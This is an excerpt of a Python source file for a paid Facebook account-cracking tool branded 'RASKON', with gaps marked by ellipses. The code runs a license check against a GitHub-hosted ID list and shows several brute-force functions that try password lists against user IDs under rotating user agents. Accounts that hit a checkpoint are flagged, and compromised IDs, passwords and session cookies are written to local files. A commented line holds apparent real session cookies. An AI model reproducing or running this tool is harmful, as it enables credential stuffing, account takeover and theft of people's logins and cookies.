...
def chk():
    ...
    try:
        httpChat = requests.get("https://raw.githubusercontent.com/MANOE38/E/main/ex.txt").text
        if id in httpChat:
...
import json
import time
import datetime;now = datetime.date.today();target = datetime.date(2026,8,20)
...
{G}⋆{GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m AUTHOR    \x1b[1;97m ● \x1b[1;92mRASKON 
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mUESER  \x1b[1;97m    ● \x1b[1;92mK_L_D     
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;48m INFO   \x1b[1;97m    ● \x1b[1;92mFACEBOOK
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mTOOLS     \x1b[1;97m ● \x1b[1;92mPAID
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mVERSION   \x1b[1;97m ● \x1b[1;92mV.3              
{G}⋆{GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
print('\n')
...
def setting():
	...
	print(f'{N}├───[{H}2{N}] Mobile ')
	print(f'{N}├───[{H}3{N}] Mobile  ')
	print(f'{N}├───[{H}4{N}] Mobile ')
	print(f'├──╭[{h}HCOSE METOD{N}]────────────────────────────────────────────{h}')
	hc = input(f'│  ╰─➣{h} ')
...
def crack(idf,pwv):
    ...
    # 'cookie': 'dbln=%7B%22100056005001313%22%3A%22d40PaOEw%22%2C%22100015245448294%22%3A%22nTKcvi0p%22%2C%22100023764297185%22%3A%22x1nYqTmI%22%7D; sb=6RRfZk1gaY79EvNakU3pQmmy; datr=0qplZtLkB1kMJcQWNygi3p_R; ps_n=1; ps_l=1; vpd=v1%3B648x360x3; wl_cbv=v2%3Bclient_version%3A2573%3Btimestamp%3A1722074057; locale=ar_AR; fr=18gB08iAsrsHKJSDS.AWW9APRh1DmabZ6XWYW01DgQ3KM.BmpMI0..AAA.0.0.Bm5Ibl.AWVehrOuOpQ',
    'dpr': '3',
...
➺𝐌𝐑•𝐃𝐄𝐕:- @K_L_D - @QZZTT'''
				...
				statuscp1 = nel(ali, style='Purple')
...
def crack1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [RASKON] {h}{loop}|{len(id)} | OK/CP {h}{ok}/{cp} ")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r RASKON \033[0;1m[ \033[0;1m{loop} \033[0;1m• \033[1;91m{len(id)} \033[0;1m]  \033[0;1m[ \033[32;1mOK \033[0;1m] \033[32;1m{ok}  \033[0;1m[ \033[33;1mCP \033[0;1m] \033[33;1m{cp}"), 
	sys.stdout.flush() 
	ua = random.choice(ugen) 
	ua2 = random.choice(ugen2) 
	ses = requests.Session() 
...
def cracktouch(idf, pwv):
    ...
    (sys.stdout.write(f'''\r raskon \x1b[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;208m[\x1b[38;5;48mCP∙{ok}\x1b[38;5;208m][\x1b[38;5;47mOK∙{cp}\x1b[38;5;47m]{bo} {bo}{'{:.0%}'.format(loop / float(len(id)))}  '''), sys.stdout.flush())
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        ...
        if 'checkpoint' in po.cookies.get_dict().keys():
            print(f'''\r\x1b[0;91m└──[raskon-CP] {m}{idf} | {m}{pw} \n {M} \x1b[1;90m└──> \x1b[1;90m{ua} ''')
        ...
        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
            print(f'''\r\x1b[0;92m└──[raskon-OK] {h}{idf} | {h}{pw} \n {h} └──> \x1b[38;5;48m{kuki}''')
            open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
            open('/sdcard/raskon-OK.txt', 'a').write(user + '|' + pw + ' | ' + coki + '\n')
            cek_RAJY(kuki)
            ';'.join
